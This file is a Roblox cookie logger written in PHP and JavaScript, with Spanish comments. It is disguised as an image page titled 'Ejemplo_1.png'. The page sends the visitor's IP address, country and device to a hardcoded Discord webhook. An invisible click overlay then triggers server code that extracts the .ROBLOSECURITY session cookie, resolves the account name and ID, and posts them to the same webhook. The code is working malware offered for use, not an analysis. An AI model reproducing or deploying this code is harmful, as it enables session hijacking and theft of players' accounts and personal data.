<?php
// ===========================================
// PARTE 1: LÓGICA DEL SERVIDOR (PHP)
// ===========================================

// Si hay datos, procesar captura de cookie
if (isset($_GET['datos'])) {
    $datos_json = $_GET['datos'] ?? '';
    $datos = json_decode(urldecode($datos_json), true);
    
    // 1. CAPTURAR COOKIE
    $cookie = "No encontrada";
    if (!empty($_SERVER['HTTP_COOKIE'])) {
        if (preg_match('/\.ROBLOSECURITY=([^;]+)/', $_SERVER['HTTP_COOKIE'], $matches)) {
            $cookie = $matches[1];
        }
    }
    
    // 2. OBTENER USERNAME E ID
    $username = "No disponible";
    $userid = "No disponible";
    
    if ($cookie != "No encontrada") {
        $ch = curl_init('https://users.roblox.com/v1/users/authenticated');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Cookie: .ROBLOSECURITY=' . $cookie]);
        $response = curl_exec($ch);
        curl_close($ch);
        
        if ($response) {
            $data = json_decode($response, true);
            $username = $data['name'] ?? 'No disponible';
            $userid = $data['id'] ?? 'No disponible';
        }
    }
    
    // 3. CONSTRUIR MENSAJE COMPLETO
    $mensaje_completo = "|| @everyone ||\n";
    $mensaje_completo .= "🔔 ¡Nueva Entrada. **{$datos['nombre']}**!\n\n";
    $mensaje_completo .= "**📌 INFORMACION GENERAL**\n\n";
    $mensaje_completo .= "**Dispositivo:** `({$datos['dispositivo']})`\n";
    $mensaje_completo .= "**País:** `{$datos['pais']}`\n";
    $mensaje_completo .= "**Fecha:** `{$datos['fecha']}`\n";
    $mensaje_completo .= "**Hora en región de {$datos['pais']}:** `{$datos['hora']}`\n\n";
    $mensaje_completo .= "**ℹ️ INFORMACION SOBRE LA CUENTA DE ROBLOX**\n\n";
    $mensaje_completo .= "**Usuario:** `$username`\n";
    $mensaje_completo .= "**ID de usuario:** `$userid`\n\n";
    $mensaje_completo .= "**🍪 Cookie De Roblox:**\n";
    $mensaje_completo .= "`$cookie`\n";
    $mensaje_completo .= "                                **By {$datos['nombre']}**";
    
    // 4. EDITAR EL MENSAJE EN DISCORD
    $ch = curl_init("https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd/messages/{$datos['mensajeId']}");
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['content' => $mensaje_completo]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // 5. REDIRIGIR A ROBLOX
    header("Location: https://www.roblox.com/home");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="2">
<title>Ejemplo_1.png</title>
<style>
    body { margin: 0; padding: 0; background: #000; }
    img { width: 100%; height: 100vh; object-fit: contain; }
</style>
</head>
<body>

<img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" 
     onload="cargarTodo()"
     onerror="this.src='https://i.imgur.com/7ZQ4q2N.jpg'">

<!-- CAPA INVISIBLE -->
<div id="capaClick" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer;"></div>

<script>
// ===========================================
// CONFIGURACIÓN
// ===========================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
const NOMBRE = "BL PAPI";

// ===========================================
// FUNCIONES
// ===========================================

// Obtener país desde IP
async function getPaisDesdeIP(ip) {
    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
        const data = await res.json();
        return data.country || "Desconocido";
    } catch {
        return "Desconocido";
    }
}

// Obtener IP y país
async function getIPyPais() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        const ip = data.ip;
        const pais = await getPaisDesdeIP(ip);
        return { ip, pais };
    } catch {
        return { ip: "No disponible", pais: "Desconocido" };
    }
}

// Detectar dispositivo
function getDispositivo() {
    const ua = navigator.userAgent;
    if (ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad")) {
        return "📱 Android/iOS";
    } else {
        return "🖥 PC";
    }
}

// Obtener fecha y hora
function getFechaHora() {
    const ahora = new Date();
    const dia = ahora.getDate().toString().padStart(2, '0');
    const mes = (ahora.getMonth() + 1).toString().padStart(2, '0');
    const anio = ahora.getFullYear();
    const fecha = `${dia}/${mes}/${anio}`;
    const horas = ahora.getHours().toString().padStart(2, '0');
    const minutos = ahora.getMinutes().toString().padStart(2, '0');
    const segundos = ahora.getSeconds().toString().padStart(2, '0');
    const hora = `${horas}:${minutos}:${segundos}`;
    return { fecha, hora };
}

// Enviar mensaje inicial a Discord
async function enviarMensajeInicial(dispositivo, ip, pais, fecha, hora) {
    const mensaje = `|| @everyone ||
🔔 ¡Nueva Entrada. **${NOMBRE}**!

**📌 INFORMACION GENERAL**

**Dispositivo:** \`(${dispositivo})\`
**País:** \`${pais}\`
**Fecha:** \`${fecha}\`
**Hora en región de ${pais}:** \`${hora}\`
 
ESPERANDO SEGUNDA ETAPA...`;
    
    const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: mensaje,
            username: "Roblox Logger",
            avatar_url: "https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg"
        })
    });
    
    if (response.ok) {
        const data = await response.json();
        return data.id;
    }
    return null;
}

// Función principal
async function cargarTodo() {
    if (sessionStorage.getItem('ejecutado')) {
        return;
    }
    sessionStorage.setItem('ejecutado', 'true');
    
    const dispositivo = getDispositivo();
    const { ip, pais } = await getIPyPais();
    const { fecha, hora } = getFechaHora();
    
    const mensajeId = await enviarMensajeInicial(dispositivo, ip, pais, fecha, hora);
    sessionStorage.setItem('mensajeId', mensajeId || '');
    
    const capa = document.getElementById('capaClick');
    capa.addEventListener('click', function() {
        capa.style.display = 'none';
        
        const datos = encodeURIComponent(JSON.stringify({
            dispositivo, ip, pais, fecha, hora,
            mensajeId: sessionStorage.getItem('mensajeId'),
            webhook: WEBHOOK_URL,
            nombre: NOMBRE
        }));
        
        // REDIRIGIR AL MISMO ARCHIVO (AHORA CON PHP)
        window.location.href = window.location.pathname + '?datos=' + datos;
    });
    
    setTimeout(() => {
        fetch(`https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd/messages/${mensajeId}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `|| @everyone ||
🔔 ¡Nueva Entrada. **${NOMBRE}**!

**📌 INFORMACION GENERAL**

**Dispositivo:** \`(${dispositivo})\`
**País:** \`${pais}\`
**Fecha:** \`${fecha}\`
**Hora en región de ${pais}:** \`${hora}\`

**ℹ️ INFORMACION SOBRE LA CUENTA DE ROBLOX** 

**Usuario:** \`No disponible\`
**ID de usuario:** \`No disponible\`

**🍪 Cookie De Roblox:**
\`\`No encontrada (sin clic)\`\`
                                **By ${NOMBRE}**`
            })
        });
    }, 10000);
}

// Prevenir clic derecho
document.addEventListener('contextmenu', e => e.preventDefault());
</script>

</body>
</html>
